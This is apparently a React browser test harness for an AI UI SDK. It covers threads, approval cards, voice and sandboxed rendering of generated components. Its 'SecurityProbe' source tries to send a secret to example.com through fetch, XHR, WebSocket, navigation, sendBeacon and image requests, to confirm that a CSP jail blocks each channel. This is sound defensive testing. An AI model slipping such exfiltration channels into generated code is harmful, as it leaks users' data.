import type {
  ApprovalDecision,
  ApprovalRequest,
  Json,
  ToolOutcome,
  Tree,
  UIPayload,
  VendoTheme,
} from "@vendoai/core";
import {
  VendoProvider,
  createVendoClient,
  themeCssVariables,
  useVendoTheme,
  type OpenSurface,
  type Thread,
  type VendoClient,
} from "../../src/index.js";
import {
  ActivityPanel,
  ApprovalCard,
  AutomationsPanel,
  NoPolicyNotice,
  VendoOverlay,
  VendoPage,
  VendoPalette,
  VendoSlot,
  VendoStage,
  VendoThread,
  type VendoCommand,
} from "../../src/chrome/index.js";
import { AppFrame, PayloadView, TreeView, registerTreeRenderer, type PayloadRendererProps } from "../../src/tree/index.js";
import { browserTreeFixture } from "../fixtures/tree.js";
import {
  realtimeVoiceDriver,
  type VoiceDriver,
  type VoiceDriverEvent,
  type VoiceDriverHandlers,
  type VoiceSessionHandle,
} from "../../src/voice/index.js";
import {
  useEffect,
  useMemo,
  useState,
  type ComponentType,
  type CSSProperties,
  type ReactNode,
} from "react";
import { createRoot } from "react-dom/client";
import "./styles.css";

const NOW = "2026-07-11T12:00:00.000Z";
const ok = async (): Promise<ToolOutcome> => ({ status: "ok", output: { accepted: true } });

const destructiveApproval: ApprovalRequest = {
  id: "apr_destructive",
  call: {
    id: "call_destructive",
    tool: "host_delete_invoice",
    args: { invoiceId: "inv_42", permanent: true },
  },
  descriptor: {
    name: "host_delete_invoice",
    description: "Permanently delete an invoice",
    inputSchema: { type: "object" },
    risk: "destructive",
    critical: true,
  },
  inputPreview: "invoiceId=inv_42\npermanent=true",
  ctx: {
    principal: { kind: "user", subject: "browser-user", display: "Browser User" },
    venue: "app",
    presence: "present",
    appId: "app_1",
  },
  createdAt: NOW,
};

const darkTheme: Partial<VendoTheme> = {
  colors: {
    background: "#111827",
    surface: "#1f2937",
    text: "#f9fafb",
    muted: "#d1d5db",
    accent: "#38bdf8",
    accentText: "#082f49",
    danger: "#fda4af",
    border: "#64748b",
  },
  typography: { fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif", baseSize: "16px" },
  radius: { small: "4px", medium: "12px", large: "24px" },
  density: "comfortable",
  motion: "reduced",
};

const loudTheme: Partial<VendoTheme> = {
  colors: {
    background: "#fff7ed",
    surface: "#ffedd5",
    text: "#3b0764",
    muted: "#6b21a8",
    accent: "#7e22ce",
    accentText: "#ffffff",
    danger: "#b91c1c",
    border: "#f97316",
  },
  typography: {
    fontFamily: "Georgia, 'Times New Roman', serif",
    headingFamily: "Impact, Haettenschweiler, sans-serif",
    baseSize: "18px",
  },
  radius: { small: "2px", medium: "20px", large: "34px" },
  density: "comfortable",
  motion: "reduced",
};

const pendingThread: Thread = {
  id: "thr_1",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [{
    id: "msg_pending",
    role: "assistant",
    parts: [
      { type: "text", text: "I prepared the email and need your approval before sending." },
      {
        type: "dynamic-tool",
        toolName: "host_email_send",
        toolCallId: "call_pending",
        state: "approval-requested",
        input: { to: "finance@example.com", subject: "Invoice ready" },
        approval: { id: "apr_pending" },
      },
      {
        type: "data-vendo-approval",
        data: { toolCallId: "call_pending", risk: "write", approvalId: "apr_pending" },
      },
    ],
  }],
};

/** An in-thread app surface (VendoViewPart) whose payload carries a format no
 *  renderer is registered for — it must contain to a notice, never break the thread. */
const unknownViewThread: Thread = {
  id: "thr_unknown",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [{
    id: "msg_unknown_view",
    role: "assistant",
    parts: [
      { type: "text", text: "Here is the surface from a newer runtime." },
      {
        type: "data-vendo-view",
        data: {
          appId: "app_future",
          payload: { formatVersion: "vendo-genui/v999", root: "root", nodes: [] },
        },
      },
      { type: "text", text: "The conversation keeps going past the unknown surface." },
    ],
  }],
};

function threadClient(client: VendoClient, thread: Thread): VendoClient {
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => id === thread.id ? thread : client.threads.get(id),
    },
  };
}

/** A client whose opened surface throws when the pin mount renders it — proves
 *  the VendoSlot pin boundary falls back to the original host component
 *  (06-apps §8; 08-ui §5). The throw must happen at RENDER time (the boundary
 *  only catches render errors), so the surface's `kind` getter explodes. */
function throwingOpenClient(client: VendoClient): VendoClient {
  const broken = {} as OpenSurface;
  Object.defineProperty(broken, "kind", {
    get() { throw new Error("pin mount exploded during render"); },
  });
  return {
    ...client,
    apps: { ...client.apps, open: async () => broken },
  };
}

function HostCard({ title, total, children }: { title?: string; total?: number; children?: ReactNode }) {
  return <article className="host-card"><strong>{title}</strong><div>Bound total: {total}</div>{children}</article>;
}

function Boom(): ReactNode {
  throw new Error("host render exploded inside its node boundary");
}

const components: Record<string, ComponentType> = {
  HostCard: HostCard as ComponentType,
  Boom,
};

const tree = browserTreeFixture;

const securitySource = String.raw`
import React, { useState } from "react";

export default function SecurityProbe({ label, onRun }) {
  const [fetchStatus, setFetchStatus] = useState("not run");
  const [xhrStatus, setXhrStatus] = useState("not run");
  const [socketStatus, setSocketStatus] = useState("not run");
  const [importStatus, setImportStatus] = useState("not run");
  const [parentStatus, setParentStatus] = useState("not run");
  const [actionStatus, setActionStatus] = useState("not run");
  const [navigateStatus, setNavigateStatus] = useState("not run");
  const [beaconStatus, setBeaconStatus] = useState("not run");
  const [imageStatus, setImageStatus] = useState("not run");

  async function probeFetch() {
    try {
      await fetch("https://example.com/probe");
      setFetchStatus("UNEXPECTED SUCCESS");
    } catch {
      setFetchStatus("FAILURE (CSP)");
    }
  }

  // XHR is a distinct API from fetch but the same connect-src directive governs it.
  function probeXhr() {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", "https://example.com/xhr-exfil?secret=" + encodeURIComponent(label));
      xhr.onload = () => setXhrStatus("UNEXPECTED SUCCESS");
      xhr.onerror = () => setXhrStatus("FAILURE (CSP)");
      xhr.send();
    } catch {
      setXhrStatus("FAILURE (CSP)");
    }
  }

  // WebSocket construction is blocked outright by connect-src 'none' (throws).
  function probeSocket() {
    try {
      const socket = new WebSocket("wss://example.com/socket-exfil");
      socket.onopen = () => setSocketStatus("UNEXPECTED SUCCESS");
      socket.onerror = () => setSocketStatus("FAILURE (CSP)");
    } catch {
      setSocketStatus("FAILURE (CSP)");
    }
  }

  async function probeImport() {
    try {
      await import("https://example.com/mod.js");
      setImportStatus("UNEXPECTED SUCCESS");
    } catch {
      setImportStatus("FAILURE (CSP)");
    }
  }

  function probeParent() {
    try {
      void parent.document.body;
      setParentStatus("UNEXPECTED SUCCESS");
    } catch {
      setParentStatus("FAILURE (opaque origin)");
    }
  }

  // Exfiltration by navigating the jail frame itself: governed by neither
  // connect-src nor img-src nor the sandbox's form/popup flags.
  function probeNavigate() {
    try {
      location.href = "https://example.com/nav-exfil?secret=" + encodeURIComponent(label);
      setNavigateStatus("navigation attempted");
    } catch {
      setNavigateStatus("FAILURE (blocked)");
    }
  }

  function probeBeacon() {
    try {
      const ok = navigator.sendBeacon("https://example.com/beacon", "secret");
      setBeaconStatus(ok ? "UNEXPECTED SUCCESS" : "FAILURE (CSP)");
    } catch {
      setBeaconStatus("FAILURE (CSP)");
    }
  }

  function probeImage() {
    const img = new Image();
    img.onload = () => setImageStatus("UNEXPECTED SUCCESS");
    img.onerror = () => setImageStatus("FAILURE (CSP)");
    img.src = "https://example.com/pixel.png?secret=1";
  }

  async function dispatch() {
    await onRun();
    setActionStatus("delivered");
  }

  return <section aria-label="Generated security probe">
    <h2>{label}</h2>
    <button type="button" onClick={probeFetch}>Probe fetch</button>
    <output id="fetch-status">fetch: {fetchStatus}</output>
    <button type="button" onClick={probeXhr}>Probe xhr</button>
    <output id="xhr-status">xhr: {xhrStatus}</output>
    <button type="button" onClick={probeSocket}>Probe socket</button>
    <output id="socket-status">socket: {socketStatus}</output>
    <button type="button" onClick={probeImport}>Probe import</button>
    <output id="import-status">import: {importStatus}</output>
    <button type="button" onClick={probeParent}>Probe parent DOM</button>
    <output id="parent-status">parent: {parentStatus}</output>
    <button type="button" onClick={dispatch}>Dispatch action</button>
    <output id="action-status">action: {actionStatus}</output>
    <button type="button" onClick={probeNavigate}>Probe navigate</button>
    <output id="navigate-status">navigate: {navigateStatus}</output>
    <button type="button" onClick={probeBeacon}>Probe beacon</button>
    <output id="beacon-status">beacon: {beaconStatus}</output>
    <button type="button" onClick={probeImage}>Probe image</button>
    <output id="image-status">image: {imageStatus}</output>
  </section>;
}
`;

const throwingSource = String.raw`
export default function ThrowingGeneratedComponent() {
  throw new Error("generated render exploded inside its jail");
}
`;

const jailTree: Tree = {
  formatVersion: "vendo-genui/v1",
  root: "root",
  nodes: [
    { id: "root", component: "Stack", children: ["before", "probe", "thrower", "after"] },
    { id: "before", component: "Text", props: { text: "Jail siblings before" } },
    {
      id: "probe",
      component: "SecurityProbe",
      source: "generated",
      props: {
        label: "Rendered generated props",
        onRun: { $action: "fn:secure-submit", payload: { invoiceId: "inv_42" } },
      },
    },
    { id: "thrower", component: "ThrowingGeneratedComponent", source: "generated" },
    { id: "after", component: "Text", props: { text: "Jail sibling survived" } },
  ],
  components: {
    SecurityProbe: securitySource,
    ThrowingGeneratedComponent: throwingSource,
  },
};

class ScriptedBrowserVoiceDriver implements VoiceDriver {
  start(handlers: VoiceDriverHandlers): VoiceSessionHandle {
    let active = true;
    const emit = (event: VoiceDriverEvent) => { if (active) handlers.onEvent(event); };
    queueMicrotask(() => {
      emit({ type: "state", state: "listening" });
      emit({ type: "transcript", entry: { id: "voice-user", role: "user", text: "Show revenue", final: true } });
      emit({ type: "transcript", entry: { id: "voice-assistant", role: "assistant", text: "Revenue is ready", final: true } });
    });
    return { stop: () => { active = false; } };
  }
}

function AutoOpen({ selector, children }: { selector: string; children: ReactNode }) {
  useEffect(() => {
    queueMicrotask(() => document.querySelector<HTMLElement>(selector)?.click());
  }, [selector]);
  return children;
}

function OpenPalette() {
  const [command, setCommand] = useState<VendoCommand>();
  const open = () => globalThis.dispatchEvent(new KeyboardEvent("keydown", { key: "k", ctrlKey: true, bubbles: true }));
  useEffect(() => {
    queueMicrotask(() => {
      document.querySelector<HTMLElement>("[data-testid=palette-opener]")?.focus();
      open();
    });
  }, []);
  return <><button type="button" data-testid="palette-opener" onClick={open}>Open command palette</button><VendoPalette onCommand={setCommand} /><output className="recorder" data-testid="command-recorder">{command ? JSON.stringify(command) : "No command selected"}</output></>;
}

function ApprovalScenario() {
  const [decision, setDecision] = useState<ApprovalDecision>();
  const decide = async (next: ApprovalDecision) => setDecision(next);
  return decision
    ? <output className="recorder" data-testid="approval-recorder">resolved: {JSON.stringify(decision)}</output>
    : <ApprovalCard approval={destructiveApproval} onDecide={decide} />;
}

function TreeThemeBoundary({ children }: { children: ReactNode }) {
  const theme = useVendoTheme();
  return <div className="tree-theme-boundary" style={themeCssVariables(theme) as CSSProperties}>{children}</div>;
}

function TreeScenario({ jail = false }: { jail?: boolean }) {
  const [action, setAction] = useState<{ nodeId: string; action: string; payload?: Json }>();
  const onAction = async (request: { nodeId: string; action: string; payload?: Json }): Promise<ToolOutcome> => {
    setAction(request);
    return { status: "ok", output: { recorded: true } };
  };
  return (
    <TreeThemeBoundary>
      <TreeView tree={jail ? jailTree : tree} components={components} onAction={onAction} />
      {jail ? <output className="recorder" data-testid="action-recorder">{action ? JSON.stringify(action) : "No action recorded"}</output> : null}
    </TreeThemeBoundary>
  );
}

function StageScenario() {
  const driver = useMemo(() => new ScriptedBrowserVoiceDriver(), []);
  return (
    <VendoProvider client={baseClient} voice={{ driver }}>
      <AutoOpen selector='button[aria-label="Start voice"], button'>
        <VendoStage />
      </AutoOpen>
    </VendoProvider>
  );
}

/** LIVE scenario (OPENAI_API_KEY-gated spec): the REAL realtime WebRTC driver.
 *  The ephemeral client secret arrives in the URL hash — the standing API key
 *  never reaches the browser, exactly as the driver's getSession() seam intends. */
function LiveStageScenario() {
  const driver = useMemo(() => {
    const clientSecret = decodeURIComponent(globalThis.location.hash.slice(1));
    return realtimeVoiceDriver({
      getSession: async () => ({ clientSecret }),
      instructions: "You are a terse test agent. Say 'ready' and wait.",
    });
  }, []);
  return (
    <VendoProvider client={baseClient} voice={{ driver }}>
      <VendoStage />
    </VendoProvider>
  );
}

function AppFrameScenario() {
  const cover = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='640' height='320'%3E%3Crect width='640' height='320' fill='%23ede9fe'/%3E%3Crect x='36' y='48' width='380' height='30' rx='8' fill='%238b5cf6'/%3E%3Crect x='36' y='106' width='550' height='18' rx='6' fill='%23c4b5fd'/%3E%3Crect x='36' y='145' width='490' height='18' rx='6' fill='%23ddd6fe'/%3E%3C/svg%3E";
  return (
    <div className="appframe-grid">
      <section aria-label="HTTP app frame same-origin"><h2>HTTP same-origin</h2><AppFrame surface={{ kind: "http", url: "/frame-target.html" }} /></section>
      <section aria-label="HTTP app frame cross-origin"><h2>HTTP cross-origin</h2><AppFrame surface={{ kind: "http", url: "https://app.example.com/machine" }} /></section>
      <section aria-label="Resuming app frame"><h2>Resuming</h2><AppFrame surface={{ kind: "resuming", cover }} /></section>
    </div>
  );
}

const baseClient = createVendoClient({ baseUrl: "/api/vendo" });

/** Containment (c): an unregistered formatVersion must render a contained notice
 *  both when handed straight to the renderer AND when it arrives in a thread. */
function UnknownFormatScenario() {
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  return (
    <div className="unknown-format-grid">
      <section aria-label="Unknown format direct">
        <h2>Direct renderer</h2>
        <PayloadView
          payload={{ formatVersion: "vendo-genui/v999", root: "root", nodes: [] }}
          components={components}
          onAction={noop}
        />
        <p>Host content after the direct unknown surface survived.</p>
      </section>
      <section aria-label="Unknown format in thread">
        <h2>In a thread</h2>
        <VendoProvider client={threadClient(baseClient, unknownViewThread)} components={components}>
          <VendoThread threadId="thr_unknown" />
        </VendoProvider>
      </section>
    </div>
  );
}

/** Containment (b): a dangling child renders a skeleton; when the streamed node
 *  later arrives, the skeleton swaps in for the real content. */
function StreamCompletionScenario() {
  const [complete, setComplete] = useState(false);
  useEffect(() => {
    const timer = globalThis.setTimeout(() => setComplete(true), 250);
    return () => globalThis.clearTimeout(timer);
  }, []);
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  const streamingTree: Tree = {
    formatVersion: "vendo-genui/v1",
    root: "root",
    nodes: [
      { id: "root", component: "Stack", children: ["late"] },
      ...(complete ? [{ id: "late", component: "Text", props: { text: "Streamed node arrived" } }] : []),
    ],
  };
  return (
    <div data-stream-complete={complete}>
      <TreeView tree={streamingTree} components={components} onAction={noop} />
    </div>
  );
}

/** Containment (d): a pin/app that throws on mount → the VendoSlot error boundary
 *  falls back to the ORIGINAL host component (the children). */
function SlotFallbackScenario() {
  return (
    <VendoProvider client={throwingOpenClient(baseClient)} components={components}>
      <VendoSlot id="hero" appId="app_1">
        <section aria-label="Original host component"><h2>Original host hero</h2><p>Host fallback stayed on screen.</p></section>
      </VendoSlot>
    </VendoProvider>
  );
}

/**
 * FORMAT-EVOLUTION FIRE DRILL (08-ui §5; 01-core §8). A throwaway second UI
 * format, registered ONLY in this test harness — never in product source. It
 * proves the renderer registry's evolution seam opens in a real browser: a
 * registered drill renderer renders; an unregistered drill tag contains to a
 * notice while v1 trees on the same page keep rendering; and a stored v0 tree
 * renders identically whether or not the drill format is registered.
 */
const DRILL_FORMAT = "vendo/tree@2-drill";

interface DrillBlock { heading: string; body: string }

const drillPayload = {
  formatVersion: DRILL_FORMAT,
  // Deliberately non-tree-shaped (no root/nodes): a future format owns its body.
  blocks: [
    { heading: "Quarterly revenue", body: "$4,200 across 3 invoices" },
    { heading: "Next step", body: "Send the reminder" },
  ] satisfies DrillBlock[],
};

/** A throwaway renderer for the drill format's block-list shape. */
function DrillRenderer({ payload }: PayloadRendererProps) {
  const blocks = (payload as { blocks?: DrillBlock[] }).blocks ?? [];
  return (
    <section aria-label="Drill format surface">
      {blocks.map((block, index) => (
        <article key={index}><h3>{block.heading}</h3><p>{block.body}</p></article>
      ))}
    </section>
  );
}

/** A stable v0 tree used as the "stored old-format record" across both drill
 *  scenarios — its rendering must be byte-for-byte the same registered or not. */
const storedV1Tree: Tree = {
  formatVersion: "vendo-genui/v1",
  root: "root",
  data: { invoice: { total: 4200 } },
  nodes: [
    { id: "root", component: "Stack", props: { gap: 8 }, children: ["heading", "amount"] },
    { id: "heading", component: "Text", props: { text: "Stored v0 invoice", variant: "heading" } },
    { id: "amount", component: "Text", props: { text: { $path: "/invoice/total" } } },
  ],
};

function FormatDrillScenario({ registered }: { registered: boolean }) {
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  // Registration is a real-browser side effect on the module-level registry;
  // each page load is a fresh module, so `registered` fully controls the seam.
  if (registered) registerTreeRenderer(DRILL_FORMAT, DrillRenderer);
  return (
    <div className="format-drill-grid">
      <section aria-label="Drill payload">
        <h2>Drill format payload</h2>
        <PayloadView payload={drillPayload} components={components} onAction={noop} />
      </section>
      <section aria-label="Stored v0 tree">
        <h2>Stored v0 record</h2>
        <PayloadView payload={storedV1Tree as unknown as UIPayload} components={components} onAction={noop} />
      </section>
      <p>Host content after the drill surfaces survived.</p>
    </div>
  );
}

function scenario(pathname: string): { title: string; theme?: Partial<VendoTheme>; content: ReactNode; ownProvider?: boolean } {
  switch (pathname) {
    case "/thread": return { title: "Thread — dark theme", theme: darkTheme, content: <VendoThread threadId="thr_1" /> };
    case "/overlay": return { title: "Overlay", content: <AutoOpen selector='button[aria-controls="vendo-overlay-dialog"]'><VendoOverlay /></AutoOpen> };
    case "/page": return { title: "Workspace — Apps tab", content: <AutoOpen selector='[role="tab"][aria-controls="vendo-panel-apps"]'><VendoPage /></AutoOpen> };
    case "/palette": return { title: "Command palette", content: <OpenPalette /> };
    case "/approval": return { title: "Destructive approval", content: <ApprovalScenario /> };
    case "/activity": return { title: "Activity", content: <ActivityPanel /> };
    case "/automations": return { title: "Automations", content: <AutomationsPanel /> };
    case "/notice": return { title: "Unconfigured policy", content: <NoPolicyNotice /> };
    case "/stage": return { title: "Voice stage", content: <StageScenario />, ownProvider: true };
    case "/stage-live": return { title: "Voice stage (live)", content: <LiveStageScenario />, ownProvider: true };
    case "/tree": return { title: "Tree containment", content: <TreeScenario /> };
    case "/tree-jail": return { title: "Generated component jail", content: <TreeScenario jail /> };
    case "/tree-themed": return { title: "Tree — loud host theme", theme: loudTheme, content: <TreeScenario /> };
    case "/tree-stream": return { title: "Streaming completion", content: <StreamCompletionScenario /> };
    case "/unknown-format": return { title: "Unknown UI format", content: <UnknownFormatScenario />, ownProvider: true };
    case "/format-drill-registered": return { title: "Format drill — registered", content: <FormatDrillScenario registered />, ownProvider: true };
    case "/format-drill-unregistered": return { title: "Format drill — unregistered", content: <FormatDrillScenario registered={false} />, ownProvider: true };
    case "/slot": return { title: "Inline app slot", content: <VendoSlot id="hero" appId="app_1"><section aria-label="Original host component"><h2>Original host hero</h2></section></VendoSlot> };
    case "/slot-fallback": return { title: "Slot pin fallback", content: <SlotFallbackScenario />, ownProvider: true };
    case "/appframe": return { title: "App execution planes", content: <AppFrameScenario /> };
    default: return { title: "Unknown scenario", content: <p role="alert">Unknown browser scenario: {pathname}</p> };
  }
}

function Harness() {
  const current = scenario(globalThis.location.pathname);
  const content = current.ownProvider
    ? current.content
    : (
      <VendoProvider
        client={globalThis.location.pathname === "/thread" ? threadClient(baseClient, pendingThread) : baseClient}
        components={components}
        theme={current.theme}
      >
        {current.content}
      </VendoProvider>
    );
  return (
    <main className={`harness-shell${globalThis.location.pathname === "/thread" ? " harness-dark" : ""}`} data-scenario={globalThis.location.pathname.slice(1)}>
      <h1 className="harness-heading">{current.title}</h1>
      <div className="harness-surface">{content}</div>
    </main>
  );
}

const root = document.getElementById("root");
if (!root) throw new Error("Browser harness root is missing.");
createRoot(root).render(<Harness />);
